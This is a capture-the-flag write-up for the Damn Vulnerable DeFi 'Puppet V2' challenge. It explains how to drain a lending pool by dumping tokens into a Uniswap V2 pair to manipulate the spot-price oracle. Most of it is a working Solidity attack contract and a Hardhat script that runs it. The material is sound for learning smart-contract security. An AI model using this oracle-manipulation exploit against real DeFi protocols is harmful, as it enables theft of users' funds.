# 09_PuppetV2

## Challenge

We get pretty much the same construct as in the first puppet challenge. We have an UniswapV2 Router & Factory as well as a lending pool, in which we can lend out tokens if we put in enough WETH. Our goal is to drain the pool.

## Solution

We can pretty much do the same as in Puppet here. We use our tokens to manipulate the price of the AMM. 

We can do this by first swapping all our tokens for WETH. This already crashes the token price by enough to be able to withdraw all the tokens from the pool. So we now just need to withdraw all the money from the pool and are done.

I implemented this using an attack contract as I didn't want to do a single line of hardhat code more than I needed to. My contract is a bit more versatile than needed, as I expected that we would need to do the whole process multiple times. 
I added the 2 functions maxLend() and neededCollateral() to make it easier to calculate. If you want to see the full code check out the sources, I have added a simplified version here.

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.6.0;

import "./PuppetV2Pool.sol";
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';
import "hardhat/console.sol";

contract AttackV2Puppet{
    using SafeMath for uint256;

    PuppetV2Pool pool;
    IERC20 dvt;
    IERC20 weth;
    IUniswapV2Pair pair;
    IUniswapV2Router02 router;
    IUniswapV2Factory factory;

    constructor(address _pool, address _router, address _token, address _weth, address _pair, address _factory) payable public
    {
        dvt = IERC20(_token);
        weth = IERC20(_weth);
        pool = PuppetV2Pool(_pool);
        pair = IUniswapV2Pair(_pair);
        router = IUniswapV2Router02(_router);
        factory = IUniswapV2Factory(_factory);
    }

    function attack() external
    {
        //transfer all the tokens and weth from the owner to this contract
        dvt.transferFrom(msg.sender, address(this), dvt.balanceOf(msg.sender));
        weth.transferFrom(msg.sender, address(this), weth.balanceOf(msg.sender));

        //We do this until we have no more tokens in the pool

        //PHASE 1: Swapping at the AMM
        //approve the router to spend our tokens
        dvt.approve(address(router), dvt.balanceOf(address(this)));

        //generate the path
        address[] memory path = new address[](2);
        path[0] = address(dvt);
        path[1] = address(weth);

        //swap our tokens for eth
        router.swapExactTokensForTokens(dvt.balanceOf(address(this)), 1, path, address(this), block.timestamp + 42069);

        //PHASE 2: Lending out as much as we can
        //calculate how many tokens we can lend out
        uint256 max_lend = maxLend(weth.balanceOf(address(this)));

        //we need to exactly calculate how to get the rest out
        console.log("Final Lending");

        //calculate how much weth we need to send to get the rest of the tokens out
        uint256 final_value_sent = neededCollateral(dvt.balanceOf(address(pool)));

        //approve so it can use transferFrom()
        weth.approve(address(pool), final_value_sent);
        pool.borrow(dvt.balanceOf(address(pool)));
        
        //generate the new path
        path[0] = address(weth);
        path[1] = address(dvt);

        //swap our tokens for eth
        weth.approve(address(router), weth.balanceOf(address(this)));
        router.swapExactTokensForTokens(weth.balanceOf(address(this)), 1, path, address(this), block.timestamp + 42069);

        //transfer all our tokens to the player
        dvt.transfer(msg.sender, dvt.balanceOf(address(this)));
    }

    //Collateral calculation
    function neededCollateral(uint256 amount) private view returns (uint256) {
        //retrieve the reserves of the pair from the factory
        (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(address(factory), address(weth), address(dvt));

        //calculate quote
        uint256 oraclequote =  UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);

        return (oraclequote * 3) / (1 ether);
    }

    //Max lend we will get for our WETH
    function maxLend(uint256 amount) private view returns (uint256) {
        //TODO: Possibly some fuckery in here

        //retrieve the reserves of the pair from the factory
        (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(address(factory), address(weth), address(dvt));

        return UniswapV2Library.quote(amount.mul(10 ** 18), reservesWETH, reservesToken) / (3 ether);
    }
}
```

I then deploy and run this in the hardhat script, which passes all checks.

```js
//Get our WETH
let weth_to_send = 199n * 10n ** 17n;
await weth.connect(player).deposit({value: weth_to_send});

//Deploy the attack contract
let AttackPuppet = await (await ethers.getContractFactory('AttackV2Puppet', player)).deploy(lendingPool.address, uniswapRouter.address, token.address, weth.address, uniswapExchange.address, uniswapFactory.address);

//Appove the attack contract so it can use transferFrom() to get its WETH & tokens
await weth.connect(player).approve(AttackPuppet.address, weth_to_send);
await token.connect(player).approve(AttackPuppet.address, PLAYER_INITIAL_TOKEN_BALANCE);

// Swap tokens for ETH /reduce price oracle
await AttackPuppet.attack();
```
